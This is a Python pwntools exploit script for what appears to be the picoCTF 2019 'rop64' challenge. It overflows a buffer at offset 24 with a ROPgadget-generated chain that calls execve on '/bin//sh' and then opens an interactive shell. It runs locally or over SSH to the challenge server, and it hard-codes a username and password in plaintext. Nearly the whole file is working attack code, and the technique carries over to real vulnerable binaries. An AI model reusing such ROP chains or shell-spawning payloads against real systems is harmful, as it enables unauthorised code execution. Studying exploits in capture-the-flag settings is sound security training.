import os
from pwn import *
from struct import pack

def send_payload(proc, payload):
    proc.sendlineafter("Can you ROP your way out of this?", payload)

def get_rop(overflow_offset):
    # execve generated by ROPgadget
    # ROPgadget --binary ./vuln  --ropchain --badbytes 0a
    
    p = ''

    p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
    p += pack('<Q', 0x00000000006b90e0) # @ .data
    p += pack('<Q', 0x00000000004156f4) # pop rax ; ret
    p += '/bin//sh'
    p += pack('<Q', 0x000000000047f561) # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
    p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
    p += pack('<Q', 0x0000000000444c50) # xor rax, rax ; ret
    p += pack('<Q', 0x000000000047f561) # mov qword ptr [rsi], rax ; ret
    p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
    p += pack('<Q', 0x00000000006b90e0) # @ .data
    p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
    p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
    p += pack('<Q', 0x00000000004499b5) # pop rdx ; ret
    p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
    p += pack('<Q', 0x0000000000444c50) # xor rax, rax ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    p += pack('<Q', 0x000000000047b6ff) # syscall

    return fit({overflow_offset: p})


argv = sys.argv
REMOTE = False
DEBUG = False

if len(argv) > 1:
    if argv[1] == 'remote':
        REMOTE = True
    if argv[1] == 'debug':
        DEBUG = True

if REMOTE:
    s = ssh(host='2019shell1.picoctf.com', user='yuvalyoBlup', password="123456789")
    io = s.process(['./vuln'], cwd='/problems/rop64_5_7608f52be26a84e5625c50ba7adb22e0')
else:
    io = process(['./vuln'])

overflow_offset = 24

payload = get_rop(overflow_offset)

log.info("Sending payload: \n{}".format(hexdump(payload)))

send_payload(io, payload)

io.interactive()